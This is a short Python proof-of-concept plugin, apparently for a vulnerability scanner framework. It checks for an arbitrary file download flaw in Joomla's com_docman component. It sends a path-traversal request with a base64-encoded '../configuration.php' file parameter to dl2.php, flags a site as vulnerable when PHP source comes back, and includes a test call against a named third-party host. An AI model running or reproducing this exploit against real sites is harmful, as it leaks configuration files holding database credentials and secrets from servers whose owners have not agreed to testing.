#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Mr.R
#_PlugName_ = Joomla com_docman 任意文件下载
#__Refer___ = https://www.bugscan.net/#!/x/1189

from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        payload = 'components/com_docman/dl2.php?archive=0&file=Li4vY29uZmlndXJhdGlvbi5waHA='
        target = arg + payload
    
        code, head, res, errcode, _ = curl.curl2(target)
        if code == 200 and "<?php" in res:
            output(target,result,'note')

        del curl
        return result


def output(url,result,label):
    info = url + '  joomla  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='joomla Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/joomla/joomla_37a9631e32aa708bd92245fc6c58a3e2.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/joomla/joomla_37a9631e32aa708bd92245fc6c58a3e2.py
#/root/github/poccreate/codesrc/exp-2730.py